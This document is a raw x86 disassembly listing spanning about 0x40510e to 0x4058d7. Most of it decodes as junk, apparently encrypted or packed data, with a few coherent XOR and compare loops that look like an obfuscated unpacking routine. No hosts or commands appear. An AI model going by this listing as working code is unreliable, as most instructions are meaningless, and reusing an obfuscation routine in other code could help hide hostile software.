  40510e:	inc    edx
  40510f:	fcomp  QWORD PTR [ecx+edi*1-0x5f]
  405113:	jg     0x405112
  405115:	rcl    DWORD PTR [edx],cl
  405117:	add    al,0x2
  405119:	aad    0x9b
  40511b:	pusha  
  40511c:	lods   al,BYTE PTR ds:[esi]
  40511d:	cli    
  40511e:	inc    ebp
  40511f:	lods   eax,DWORD PTR ds:[esi]
  405120:	or     eax,0x9fc44c54
  405125:	ss jge 0x405177
  405128:	in     al,dx
  405129:	in     al,dx
  40512a:	or     edx,ebx
  40512c:	jns    0x4051a7
  40512e:	adc    DWORD PTR [ecx],esp
  405130:	xor    bl,bl
  405132:	lock sub DWORD PTR [esi],edi
  405135:	int3   
  405136:	fsubr  st(2),st
  405138:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40513a:	loopne 0x405109
  40513c:	ret    
  40513d:	xchg   ecx,eax
  40513e:	push   ecx
  40513f:	mov    bl,BYTE PTR [esi]
  405141:	sahf   
  405142:	ret    0xa8c6
  405145:	dec    eax
  405146:	call   DWORD PTR [edx+0x4]
  405149:	xchg   ecx,eax
  40514a:	xchg   edi,eax
  40514b:	jecxz  0x405147
  40514d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40514e:	xor    eax,0x8bfbaf0f
  405153:	pop    ebp
  405154:	call   0xd16c298c
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	mov    cl,0x85
  405173:	std    
  405174:	inc    edi
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4051c0
  40517e:	push   es
  40517f:	jp     0x4051cd
  405181:	sbb    edi,DWORD PTR [ebx]
  405183:	jl     0x405138
  405185:	mov    dl,0xed
  405187:	sub    eax,0x5cba31d2
  40518c:	sub    BYTE PTR [edx+0x30],bh
  40518f:	pop    ebx
  405190:	push   eax
  405191:	nop
  405192:	dec    esp
  405193:	rol    BYTE PTR [eax],cl
  405195:	add    esp,edi
  405197:	xor    ah,BYTE PTR [edx-0x7f]
  40519a:	cli    
  40519b:	(bad)  
  40519c:	fiadd  WORD PTR [edx+0x38c875d3]
  4051a2:	je     0x4051dd
  4051a4:	cli    
  4051a5:	jmp    0x40515d
  4051a7:	aaa    
  4051a8:	jge    0x40516d
  4051aa:	mov    edx,0x779d6439
  4051af:	pop    es
  4051b0:	cmp    BYTE PTR [eax-0x30c491aa],ah
  4051b6:	mov    eax,0xbe692af2
  4051bb:	and    ah,ch
  4051bd:	std    
  4051be:	dec    esp
  4051bf:	bound  esp,QWORD PTR [edx+0x68]
  4051c2:	xchg   edx,eax
  4051c3:	scas   eax,DWORD PTR es:[edi]
  4051c4:	dec    esi
  4051c5:	ror    DWORD PTR [edx],1
  4051c7:	and    DWORD PTR [edi],ecx
  4051c9:	mov    ch,ah
  4051cb:	mov    bh,BYTE PTR [ebx]
  4051cd:	cs gs xchg esi,eax
  4051d0:	ins    BYTE PTR es:[edi],dx
  4051d1:	imul   esp,esp,0x43
  4051d4:	mov    bl,0x17
  4051d6:	jmp    0x643e:0x92d2427c
  4051dd:	or     dl,dh
  4051df:	cmc    
  4051e0:	addr16 mov ch,0xcc
  4051e3:	fdivr  st(2),st
  4051e5:	pop    es
  4051e6:	ins    DWORD PTR es:[edi],dx
  4051e7:	sub    al,0x31
  4051e9:	jno    0x4051a8
  4051eb:	gs (bad) 
  4051ed:	cld    
  4051ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051ef:	cmp    ah,ah
  4051f1:	push   es
  4051f2:	scas   eax,DWORD PTR es:[edi]
  4051f3:	lds    ecx,FWORD PTR [edi+0x4d390ff9]
  4051f9:	(bad)  
  4051fa:	int    0x41
  4051fc:	ficomp DWORD PTR [ecx-0x32cbae07]
  405202:	mov    al,ds:0xb2a5385
  405207:	in     eax,dx
  405208:	push   edi
  405209:	mov    ecx,0xd606a9e
  40520e:	sahf   
  40520f:	mov    ebx,0x5ba8ed3b
  405214:	imul   esi,DWORD PTR [ecx+esi*8-0x28],0x2a
  405219:	sbb    bl,ah
  40521b:	fiadd  WORD PTR [edi-0x50]
  40521e:	cmp    eax,edi
  405220:	mov    al,ds:0x7cae5382
  405225:	mov    DWORD PTR [ebx+0x4c4ef3a2],esi
  40522b:	inc    eax
  40522c:	ret    
  40522d:	ret    
  40522e:	mov    dl,0x89
  405230:	(bad)
  405233:	stos   BYTE PTR es:[edi],al
  405234:	xor    esi,esi
  405236:	sbb    dh,BYTE PTR [edi+eiz*2-0x12]
  40523a:	inc    ebx
  40523b:	scas   al,BYTE PTR es:[edi]
  40523c:	xor    al,0xa5
  40523e:	mov    ah,0x4d
  405240:	push   eax
  405241:	push   0x40ae369b
  405246:	pop    ds
  405247:	retf   0x2838
  40524a:	cli    
  40524b:	or     eax,0xd135105e
  405250:	dec    edx
  405251:	adc    eax,0x7fc9e000
  405256:	sub    esp,esi
  405258:	mov    ebp,DWORD PTR [edx]
  40525a:	aas    
  40525b:	jns    0x40520d
  40525d:	add    al,BYTE PTR ds:[ebp+0x1b]
  405261:	es mov al,0xae
  405264:	sub    esp,ebx
  405266:	ss mov bl,0x51
  405269:	xor    dh,BYTE PTR fs:[edx]
  40526c:	cld    
  40526d:	icebp  
  40526e:	mov    cl,0x49
  405270:	repnz mov ah,0x62
  405273:	aam    0x6a
  405275:	xchg   esp,eax
  405276:	sub    al,0x47
  405278:	aam    0xf4
  40527a:	jne    0x4052d5
  40527c:	xor    al,0x21
  40527e:	sub    DWORD PTR [ebx],eax
  405280:	sahf   
  405281:	mov    bl,0x80
  405283:	sbb    ebp,DWORD PTR [edi+ebp*8]
  405286:	add    ecx,DWORD PTR [esi+0x405db6ce]
  40528c:	inc    esp
  40528d:	xchg   DWORD PTR [eax-0x5a681c5e],edx
  405293:	or     edx,ebp
  405295:	ja     0x4052c4
  405297:	mov    ebx,0x135796ff
  40529c:	arpl   WORD PTR [edi+0xf9c1660],sp
  4052a2:	push   edx
  4052a3:	(bad)  
  4052a4:	cmp    DWORD PTR [edi],ecx
  4052a6:	mov    ds:0x52e7e2e0,eax
  4052ab:	ds jg  0x4052f4
  4052ae:	mov    ch,0xaf
  4052b0:	inc    esp
  4052b1:	in     eax,dx
  4052b2:	sti    
  4052b3:	aad    0x6e
  4052b5:	in     eax,0x27
  4052b7:	inc    ebx
  4052b8:	mov    edx,0xace4205e
  4052be:	cmp    ch,0xc6
  4052c1:	outs   dx,BYTE PTR ds:[esi]
  4052c2:	(bad)  
  4052c3:	retf   
  4052c4:	mov    ds:0xb2bb2d90,al
  4052c9:	gs popf 
  4052cb:	and    BYTE PTR [eax],bh
  4052cd:	mov    ecx,DWORD PTR [ebp-0x49]
  4052d0:	mov    BYTE PTR [edx+0x4ec98b15],bl
  4052d6:	mov    cl,0x22
  4052d8:	dec    edx
  4052d9:	dec    esp
  4052da:	push   ebx
  4052db:	or     ebx,DWORD PTR [esi]
  4052dd:	ror    edi,0xde
  4052e0:	or     dl,BYTE PTR [ecx]
  4052e2:	cmc    
  4052e3:	call   DWORD PTR [ecx]
  4052e5:	jmp    0x405329
  4052e7:	test   DWORD PTR [esi],ecx
  4052e9:	sbb    ebp,DWORD PTR [edx-0xb48c63b]
  4052ef:	cmp    ebx,ecx
  4052f1:	cmc    
  4052f2:	fadd   QWORD PTR [eax+0x3e]
  4052f5:	mov    bl,0x5f
  4052f7:	fimul  DWORD PTR [edi]
  4052f9:	sti    
  4052fa:	scas   al,BYTE PTR es:[edi]
  4052fb:	pop    es
  4052fc:	addr16 mov ah,0x80
  4052ff:	inc    eax
  405300:	pop    esi
  405301:	popa   
  405302:	stc    
  405303:	dec    esp
  405304:	loopne 0x4052e7
  405306:	ror    DWORD PTR [ebx-0x68],cl
  405309:	ins    BYTE PTR es:[edi],dx
  40530a:	inc    ebp
  40530b:	(bad)  [eax]
  40530d:	or     esi,DWORD PTR [edi]
  40530f:	mov    ch,ah
  405311:	in     al,dx
  405312:	push   0xffffff8c
  405314:	jo     0x4052c2
  405316:	jno    0x40538b
  405318:	dec    ebx
  405319:	shr    DWORD PTR [edx-0x2d],0x4f
  40531d:	and    edx,DWORD PTR [eax+0xf]
  405320:	adc    ebp,esi
  405322:	imul   esp,edx,0x898e76d0
  405328:	test   ch,0xce
  40532b:	arpl   WORD PTR [ebx-0x36d7681a],sp
  405331:	dec    esi
  405332:	sar    DWORD PTR [ebx-0x4a],0xc5
  405336:	ss lock jmp 0x405354
  40533a:	and    al,0xd1
  40533c:	enter  0xebf5,0x55
  405340:	fsubr  st(7),st
  405342:	push   ebx
  405343:	xchg   edi,eax
  405344:	lods   al,BYTE PTR ds:[esi]
  405346:	push   edi
  405347:	mov    ah,BYTE PTR [esi+ecx*8+0x57e2f1b3]
  40534e:	shl    DWORD PTR [si-0xf2d],1
  405353:	repz cdq 
  405355:	and    DWORD PTR [edx-0x50294a59],edi
  40535b:	inc    ecx
  40535c:	mov    cl,0x9d
  40535e:	mov    edi,0x65905b1e
  405363:	call   0xe793:0x1099dc2d
  40536a:	call   0x23506f42
  40536f:	shr    DWORD PTR [ebx],1
  405371:	xchg   edi,eax
  405372:	js     0x405393
  405374:	div    BYTE PTR ds:0xdb4eed19
  40537a:	add    BYTE PTR [ebx+esi*2],ch
  40537d:	jo     0x40537b
  40537f:	and    ebp,eax
  405381:	and    DWORD PTR [eax-0x5b],eax
  405384:	mov    ds:0x468824fc,eax
  405389:	add    eax,0xf76faa2
  40538e:	jl     0x405395
  405390:	les    edx,FWORD PTR [esi-0x61]
  405393:	(bad)  
  405394:	stos   DWORD PTR es:[edi],eax
  405395:	jae    0x405416
  405397:	test   al,0xb6
  405399:	(bad)  
  40539a:	and    ah,BYTE PTR [esi-0x51]
  40539d:	xchg   edi,eax
  40539e:	inc    ebp
  40539f:	dec    ecx
  4053a0:	push   0x797ff21
  4053a5:	xchg   esp,eax
  4053a6:	es jecxz 0x405367
  4053a9:	out    dx,al
  4053aa:	inc    esi
  4053ab:	fwait
  4053ac:	clc    
  4053ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053ae:	mov    edx,0xe2bc867f
  4053b3:	jno    0x4053d4
  4053b5:	jns    0x40536a
  4053b7:	sbb    al,0x82
  4053b9:	adc    BYTE PTR [edi-0x7302d80e],ch
  4053bf:	ins    BYTE PTR es:[edi],dx
  4053c0:	shl    DWORD PTR [eax-0x5e6a332d],1
  4053c6:	or     edx,0x1a3b9336
  4053cc:	fisubr DWORD PTR [ebx]
  4053ce:	sbb    al,0x5d
  4053d0:	addr16 aam 0x86
  4053d3:	sar    DWORD PTR [ebx],cl
  4053d5:	xchg   ebx,eax
  4053d6:	add    ebp,DWORD PTR [ecx-0x70]
  4053d9:	xchg   esi,eax
  4053da:	xor    ah,BYTE PTR [ecx]
  4053dc:	or     eax,ebx
  4053de:	dec    edi
  4053df:	jne    0x405368
  4053e1:	into   
  4053e2:	sbb    dh,BYTE PTR [esp+ecx*2+0x79845e96]
  4053e9:	jp     0x405444
  4053eb:	addr16 sahf 
  4053ed:	cmp    al,0x91
  4053ef:	inc    esi
  4053f0:	xchg   ecx,eax
  4053f1:	pop    esp
  4053f2:	jp     0x405454
  4053f4:	cdq    
  4053f5:	repnz cmp BYTE PTR [edi-0x23],cl
  4053f9:	add    ecx,ecx
  4053fb:	pop    edx
  4053fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053fd:	xchg   esi,eax
  4053fe:	xor    BYTE PTR [eax-0x294f9d6c],al
  405404:	mov    dl,BYTE PTR [edx-0x4e]
  405407:	bound  edx,QWORD PTR [edi+ebp*1]
  40540a:	lahf   
  40540b:	retf   
  40540c:	and    edi,DWORD PTR [eax-0xc]
  40540f:	cmp    cl,BYTE PTR [eax+edx*8]
  405412:	fimul  DWORD PTR [esi-0x47]
  405415:	(bad)  
  405416:	xchg   ebp,eax
  405417:	mov    edx,0x68b5118e
  40541c:	(bad)  
  40541d:	jnp    0x405476
  40541f:	popa   
  405420:	mul    ebx
  405422:	retf   0xfe51
  405425:	cs jo  0x40548d
  405428:	and    DWORD PTR [ecx],0x29
  40542b:	inc    esi
  40542c:	xchg   ebx,eax
  40542d:	out    0xd0,eax
  40542f:	retf   
  405430:	test   al,0xdf
  405432:	cmp    al,0x5e
  405434:	jecxz  0x40540e
  405436:	retf   0x9c79
  405439:	out    dx,eax
  40543a:	xchg   ebx,eax
  40543b:	test   BYTE PTR [edx+edi*2],dl
  40543e:	test   DWORD PTR [eax+0x57e2eb6f],ebx
  405444:	scas   al,BYTE PTR es:[edi]
  405445:	gs jge 0x405441
  405448:	std    
  405449:	cmp    DWORD PTR [ecx],0x1858cdf4
  40544f:	jnp    0x405434
  405451:	jg     0x40542d
  405453:	and    BYTE PTR [ebp+0xa0c7990],cl
  405459:	jno    0x4054ca
  40545b:	or     al,0xf9
  40545d:	mov    ebx,0x789b0fc5
  405462:	xchg   ebx,eax
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x69910448]
  405484:	out    0xfb,eax
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054f3
  40548f:	add    dl,0x12
  405492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405493:	pusha  
  405494:	icebp  
  405495:	mov    ds:0x531afac9,al
  40549a:	xor    al,BYTE PTR [eax+0x20]
  40549d:	lods   eax,DWORD PTR ds:[esi]
  40549e:	mov    ds:0x5dc138e4,eax
  4054a3:	add    DWORD PTR [ecx+0x8dfbf48],edi
  4054a9:	in     eax,dx
  4054aa:	mov    edi,0x97d3317
  4054af:	mov    eax,0x875eef29
  4054b4:	mov    al,ds:0xa30f3c97
  4054b9:	in     al,dx
  4054ba:	jns    0x405539
  4054bc:	push   ecx
  4054bd:	mov    dl,0xde
  4054bf:	adc    ch,ah
  4054c1:	pop    ebx
  4054c2:	mov    ch,BYTE PTR [ebx+0x75]
  4054c5:	and    BYTE PTR [esi-0x55],cl
  4054c8:	das    
  4054c9:	dec    eax
  4054ca:	unpcklps xmm0,xmm5
  4054cd:	sub    al,0x66
  4054cf:	fstp   TBYTE PTR [ebp-0x6f]
  4054d2:	adc    cl,al
  4054d4:	ins    DWORD PTR es:[edi],dx
  4054d5:	mov    ah,0xc6
  4054d7:	in     eax,0x9d
  4054d9:	sbb    edx,DWORD PTR ds:0x4a09c9b3
  4054df:	add    eax,0x3014a952
  4054e4:	add    eax,DWORD PTR [edi+eax*4]
  4054e7:	push   es
  4054e8:	enter  0x9b6,0xf3
  4054ec:	xchg   edi,eax
  4054ed:	push   0xffffffa0
  4054ef:	adc    BYTE PTR [esp+eax*8+0xda77bcb],0xa3
  4054f7:	mov    ds:0x2b60775f,al
  4054fc:	sbb    BYTE PTR [esi],cl
  4054fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054ff:	out    0x44,al
  405501:	xchg   edi,eax
  405502:	js     0x405493
  405504:	dec    esp
  405505:	imul   edi,ebp,0xffffff82
  405508:	fisttp QWORD PTR [ebp+0x5d578d6f]
  40550e:	out    0x13,al
  405510:	mov    ah,0x16
  405512:	pushf  
  405513:	cmp    DWORD PTR [edi+0x2e],edi
  405516:	and    esp,esi
  405518:	lock jge 0x4054e4
  40551b:	adc    eax,0xf790351b
  405520:	jmp    0x40553e
  405522:	mov    ebp,0x28c2035d
  405527:	and    al,0x66
  405529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40552a:	out    dx,al
  40552b:	or     eax,0x7251d063
  405530:	leave  
  405531:	xchg   bl,cl
  405533:	inc    ebp
  405534:	xchg   esp,eax
  405535:	int    0xd6
  405537:	(bad)  
  405538:	(bad)  [eax+0x37]
  40553b:	aad    0x8b
  40553d:	xor    dl,0x88
  405540:	icebp  
  405541:	mov    edx,0x9d55390c
  405546:	jg     0x405571
  405548:	cmp    ch,bh
  40554a:	ds ret 0x4efd
  40554e:	cmp    DWORD PTR [esi],eax
  405550:	stos   DWORD PTR es:[edi],eax
  405551:	sub    al,0xeb
  405553:	fwait
  405554:	dec    ebp
  405555:	and    DWORD PTR [ebp+0x28],eax
  405558:	nop
  405559:	jecxz  0x4054e0
  40555b:	mov    al,ds:0x62728f52
  405560:	jns    0x405507
  405562:	sub    al,0x75
  405564:	mov    ecx,0xd8e4a2b4
  405569:	adc    BYTE PTR [edi+0x38],dh
  40556c:	test   DWORD PTR [esi],ecx
  40556e:	cs mov dh,0x80
  405571:	dec    ebp
  405572:	or     BYTE PTR [ecx+esi*4+0x6e],al
  405576:	xor    dl,dh
  405578:	popf   
  405579:	dec    ecx
  40557a:	nop
  40557b:	sub    DWORD PTR [esi+eax*2+0x5],eax
  40557f:	xor    dl,dl
  405581:	(bad)
  405584:	add    BYTE PTR [edi+edx*1+0x54f0eb29],ah
  40558b:	sbb    BYTE PTR [ebx+0x49],al
  40558e:	and    al,0xd8
  405590:	ds sub eax,0x9acc200b
  405596:	jbe    0x4055c9
  405598:	mov    cl,0xb8
  40559a:	xchg   ebx,eax
  40559b:	sub    esp,ebp
  40559d:	and    BYTE PTR [ebp-0x5a10e411],cl
  4055a3:	mov    eax,ds:0x4e53884d
  4055a8:	or     BYTE PTR [edi+0x3d],dh
  4055ab:	xor    BYTE PTR [edi+0xf],ch
  4055ae:	push   ss
  4055af:	mov    ebp,0xb28e214b
  4055b4:	push   0x2e
  4055b6:	add    eax,0x299523ce
  4055bb:	out    dx,al
  4055bc:	jge    0x405632
  4055be:	out    0x0,al
  4055c0:	add    esp,ebx
  4055c2:	sub    edi,DWORD PTR [eax+0x6a]
  4055c5:	mov    ebx,0x8300f565
  4055ca:	dec    ebx
  4055cb:	mov    esi,0xb7b884c6
  4055d0:	pop    esp
  4055d1:	nop
  4055d2:	xchg   cl,cl
  4055d4:	js     0x405602
  4055d6:	fist   DWORD PTR [ebx]
  4055d8:	mov    ds:0xa2baf991,al
  4055dd:	mov    bl,0x7f
  4055df:	repnz aam 0x8f
  4055e2:	fdiv   DWORD PTR [eax+0x765197b5]
  4055e8:	ss xchg edi,eax
  4055ea:	lock or BYTE PTR [ecx],ch
  4055ed:	fdiv   DWORD PTR [ebx]
  4055ef:	repz lahf 
  4055f1:	es dec ecx
  4055f3:	arpl   WORD PTR [edi],dx
  4055f5:	pop    ecx
  4055f6:	test   DWORD PTR [edx+0x76],esp
  4055f9:	imul   ebp,eax,0xbd6ae1c5
  4055ff:	mov    al,0x66
  405601:	adc    eax,0xa2c5fbe6
  405606:	jae    0x4055dc
  405608:	mov    al,0x75
  40560a:	ins    DWORD PTR es:[edi],dx
  40560b:	loope  0x40564c
  40560d:	sti    
  40560e:	sub    al,bl
  405610:	loopne 0x405657
  405612:	jnp    0x4055ff
  405614:	mov    ah,BYTE PTR [ebp+eiz*4+0x12a4ced7]
  40561b:	inc    esi
  40561c:	push   esp
  40561d:	or     eax,0xe73840d
  405622:	cs dec eax
  405624:	inc    ebx
  405625:	psllq  mm6,QWORD PTR [eax-0x4f]
  405629:	into   
  40562a:	jg     0x405659
  40562c:	scas   al,BYTE PTR es:[edi]
  40562d:	daa    
  40562e:	leave  
  40562f:	push   ss
  405630:	push   eax
  405631:	mov    bh,0x24
  405633:	pop    esi
  405634:	push   esp
  405635:	rcr    BYTE PTR [edx],0x31
  405638:	add    al,0x8d
  40563a:	mov    edx,0xfac2cd5b
  40563f:	repnz adc esi,DWORD PTR [edi-0x7355e69f]
  405646:	nop
  405647:	in     eax,dx
  405648:	in     al,0xf4
  40564a:	pop    es
  40564b:	data16 loop 0x405678
  40564e:	adc    DWORD PTR [ebp-0x7f],esp
  405651:	jmp    DWORD PTR [ebx-0x38921e10]
  405657:	inc    edx
  405658:	mov    esi,0x2906d3c2
  40565d:	pusha  
  40565e:	dec    ebp
  40565f:	and    al,0xd
  405661:	out    dx,eax
  405662:	mov    ch,0xee
  405664:	push   ss
  405665:	jo     0x405677
  405667:	jmp    0x4eee:0x2a3236cd
  40566e:	pop    edi
  40566f:	mov    ch,0x74
  405671:	pop    esp
  405672:	ja     0x405615
  405674:	xor    BYTE PTR ds:[eax-0x66c3929e],bl
  40567b:	hlt    
  40567c:	inc    eax
  40567d:	pop    ds
  40567e:	clc    
  40567f:	les    edx,FWORD PTR [ebp+esi*4-0x221150a9]
  405686:	sub    BYTE PTR [edx-0x6a],0xe4
  40568a:	adc    DWORD PTR [ebx+ebx*8],eax
  40568d:	mov    edi,0x401449bb
  405692:	jno    0x4056cb
  405694:	adc    ebx,esi
  405696:	test   BYTE PTR [eax+esi*4-0x53],bl
  40569a:	test   al,0x9b
  40569c:	add    BYTE PTR [eax],0xe2
  40569f:	pop    ecx
  4056a0:	retf   0x298d
  4056a3:	adc    eax,0x6fc3d4b8
  4056a8:	fiadd  DWORD PTR es:[esi-0x65]
  4056ac:	js     0x4056e4
  4056ae:	scas   al,BYTE PTR es:[edi]
  4056af:	adc    BYTE PTR [edi+0x46b880f2],bl
  4056b5:	mov    esi,0xddfeafe3
  4056ba:	cmp    DWORD PTR [edi+0x77e4f317],esi
  4056c0:	sti    
  4056c1:	mov    edi,0x581b8fb9
  4056c6:	push   esp
  4056c7:	pop    eax
  4056c8:	inc    eax
  4056c9:	inc    esi
  4056ca:	int    0x7e
  4056cc:	das    
  4056cd:	pop    es
  4056ce:	div    eax
  4056d0:	sub    DWORD PTR [edi],ecx
  4056d2:	xchg   esi,eax
  4056d3:	stos   DWORD PTR es:[edi],eax
  4056d4:	fidiv  DWORD PTR [eax]
  4056d6:	outs   dx,DWORD PTR ds:[esi]
  4056d7:	out    0x4a,eax
  4056d9:	repnz neg BYTE PTR [esi-0x5053a524]
  4056e0:	adc    eax,DWORD PTR [edx-0x2c1f8392]
  4056e6:	addr16 push ecx
  4056e8:	jp     0x405755
  4056ea:	add    DWORD PTR ds:0xe56ba75b,0x73
  4056f1:	shl    dl,0xd7
  4056f4:	icebp  
  4056f5:	mov    ebx,DWORD PTR [edx-0x2e]
  4056f8:	and    al,0x3
  4056fa:	add    edi,DWORD PTR [ebp-0x35]
  4056fd:	adc    eax,0xee7f448a
  405702:	push   ebp
  405703:	inc    esp
  405704:	jp     0x4056d2
  405706:	jb     0x405751
  405708:	nop
  405709:	test   ah,0xe4
  40570c:	push   0xffffff81
  40570e:	inc    esp
  40570f:	mov    WORD PTR [edi],fs
  405711:	ficomp WORD PTR [edx-0x315fc9d9]
  405717:	push   ds
  405718:	mov    ebp,0x1176cce5
  40571d:	pusha  
  40571e:	lods   al,BYTE PTR ds:[esi]
  40571f:	scas   eax,DWORD PTR es:[edi]
  405720:	jb     0x40577a
  405722:	mov    ss,WORD PTR [eax+0x0]
  405725:	stos   BYTE PTR es:[edi],al
  405726:	ret    
  405727:	shr    BYTE PTR [eax+0x53ee818a],0x4b
  40572e:	aam    0xbc
  405730:	out    0xe4,al
  405732:	xor    al,0xe7
  405734:	add    BYTE PTR [ebp+edi*2+0x729d00a],ah
  40573b:	sub    edi,ebp
  40573d:	xor    DWORD PTR [ebx+ebx*1+0x2d4701f7],0x43126a6a
  405748:	inc    esp
  405749:	clc    
  40574a:	inc    ecx
  40574b:	jl     0x4057b8
  40574d:	xchg   esp,eax
  40574e:	aad    0x9f
  405750:	arpl   WORD PTR [ebx],bp
  405752:	or     BYTE PTR [esi+eax*1-0x4b],bl
  405756:	icebp  
  405757:	jne    0x4056da
  405759:	in     eax,0x4f
  40575b:	fcom   DWORD PTR [eax]
  40575d:	je     0x405785
  40575f:	(bad)  
  405760:	pop    esp
  405761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405762:	mov    bh,0x27
  405764:	loopne 0x405779
  405766:	stc    
  405767:	not    BYTE PTR [ebx]
  405769:	rol    BYTE PTR [esp+ecx*2+0x77],0x86
  40576e:	icebp  
  40576f:	fs ret 0xb490
  405773:	xchg   DWORD PTR [ebx],esi
  405775:	rol    BYTE PTR [ebx],1
  405777:	ror    DWORD PTR [edi],1
  405779:	scas   eax,DWORD PTR es:[edi]
  40577a:	xlat   BYTE PTR ds:[ebx]
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x6d
  4057f5:	push   edi
  4057f6:	cmp    DWORD PTR [eax+0x7e7e363a],edi
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	stos   DWORD PTR es:[edi],eax
  405801:	test   DWORD PTR [ecx-0x73f0bbf8],0x8fd88b93
  40580b:	inc    edx
  40580c:	sub    DWORD PTR [ecx],esi
  40580e:	ret    
  40580f:	jecxz  0x4057f1
  405811:	imul   edx,DWORD PTR [eax+0x2c],0xd82a7495
  405818:	mov    eax,DWORD PTR [ebx+0x29594469]
  40581e:	stc    
  40581f:	inc    edi
  405820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405821:	add    eax,0xe8d26599
  405826:	jl     0x40582c
  405828:	add    cl,dl
  40582a:	inc    ebp
  40582b:	hlt    
  40582c:	jae    0x4057b5
  40582e:	aaa    
  40582f:	add    esi,DWORD PTR [ebx-0x21]
  405832:	mov    dl,BYTE PTR [ebp+0x3c95c35c]
  405838:	(bad)  
  405839:	in     al,0x2b
  40583b:	rcr    BYTE PTR [eax],1
  40583d:	inc    eax
  40583e:	mov    dh,0xd4
  405840:	jmp    0x3aa8934e
  405845:	div    WORD PTR [ecx]
  405848:	rcl    BYTE PTR ds:[edi+0x6b],1
  40584c:	mov    es,edi
  40584e:	test   eax,0xa29a3212
  405853:	adc    esp,ecx
  405855:	stos   DWORD PTR es:[edi],eax
  405856:	pop    esp
  405857:	mov    edx,0x707633e2
  40585c:	pop    edi
  40585d:	jg     0x4058af
  40585f:	test   al,0x4f
  405861:	mov    ds,WORD PTR [eax-0x2a]
  405864:	xor    BYTE PTR [ebx-0x76882131],0x62
  40586b:	icebp  
  40586c:	or     DWORD PTR [eax+ebx*1],esp
  40586f:	add    al,0x8e
  405871:	ja     0x4058b8
  405873:	xor    DWORD PTR [ebx],ecx
  405875:	cmp    BYTE PTR [edx+0x48a284f],dh
  40587b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40587c:	mov    edi,0x7d3126d6
  405881:	es rol bl,cl
  405884:	je     0x405864
  405886:	and    eax,ebx
  405888:	sar    cl,1
  40588a:	xor    bh,BYTE PTR [edi+0x1e8b7e3]
  405890:	pop    ebp
  405891:	jle    0x4058bf
  405893:	pop    esi
  405894:	in     eax,dx
  405895:	jno    0x40585e
  405897:	mov    bh,0x5c
  405899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40589a:	push   cs
  40589b:	cli    
  40589c:	adc    ebp,DWORD PTR ds:0x7347de40
  4058a2:	add    BYTE PTR [edi+0x722d76f1],0x17
  4058a9:	test   al,0x9d
  4058ab:	ficom  DWORD PTR [esi]
  4058ad:	imul   BYTE PTR [eax]
  4058af:	and    ebx,DWORD PTR [ebx]
  4058b1:	push   ebp
  4058b2:	out    0x55,eax
  4058b4:	xchg   ecx,eax
  4058b5:	stos   DWORD PTR es:[edi],eax
  4058b6:	jp     0x40585e
  4058b8:	xlat   BYTE PTR ds:[ebx]
  4058b9:	fwait
  4058ba:	adc    ebp,ebx
  4058bc:	cdq    
  4058bd:	mov    dl,0x12
  4058bf:	sub    BYTE PTR [ecx+ebp*2],al
  4058c2:	lahf   
  4058c3:	(bad)  
  4058c4:	in     al,0x13
  4058c6:	xor    DWORD PTR [edx-0x6183fafe],esi
  4058cc:	jmp    0x8075:0x783901bf
  4058d3:	je     0x4058cd
  4058d5:	adc    al,0x4a
  4058d7:	lds    edi,FWORD PTR [eax-0x5645f5bc]
